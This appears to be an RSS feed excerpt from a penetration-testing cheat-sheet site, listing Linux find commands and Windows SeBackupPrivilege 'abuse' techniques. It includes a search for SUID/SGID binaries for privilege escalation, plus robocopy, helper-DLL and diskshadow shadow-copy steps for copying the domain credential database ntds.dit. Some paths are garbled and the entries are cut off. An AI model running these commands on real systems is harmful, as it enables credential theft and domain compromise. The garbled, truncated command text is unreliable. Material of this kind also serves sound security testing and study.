channel.title: File System on TLDRBins
channel.description: Recent content in File System on TLDRBins

item.title: Find
item.description: Linux Locate a file locate <FILE> Find files of type file find . -type f Find and Open find / -name <FILE> -exec cat {} \; Find SUID bit set files find / -type f -user root \( -perm -4000 -o -perm -2000 \) 2>/dev/null -ls Find files owned by user find / -user <USER> -ls 2>/dev/null | grep -v -e " \/proc" -e " \/sys" Find files owned by group find / -group <GROUP> 2>/dev/null | grep -v -e ^/proc Find files created between 1/1/2024 and 31/12/2024 find / -type f -newermt 2024-01-01 !

item.title: SeBackupPrivilege/SeRestorePrivilege
item.description:
Abuse #1: Robocopy robocopy /b <TARGET_DIR_PATH> <DEST_DIR> <TARGET_FILE> Abuse #2: Use Helper DLLs 1. Import Helper Modules import-module .\SeBackupPrivilegeCmdLets.dll import-module .\SeBackupPrivilegeUtils.dll 2. Copy Target File Copy-FileSeBackupPrivilege '<TARGET_FILE_PATH>' 'C:\ProgramData\<TARGET_FILE>' Copy-FileSeBackupPrivilege C:\Windows
tds
tds.dit C:\ProgramData
tds.dit Ref: SeBackupPrivilegeUtils.dll Ref: SeBackupPrivilegeCmdLets.dll Abuse #3: Diskshadow 1. Create a .dsh File set context persistent nowriters set metadata C:\ProgramData	est.cab set verbose on add volume c: alias test create expose %test% x: 2. Convert to DOS Format unix2dos vss.dsh 2. Run vss.
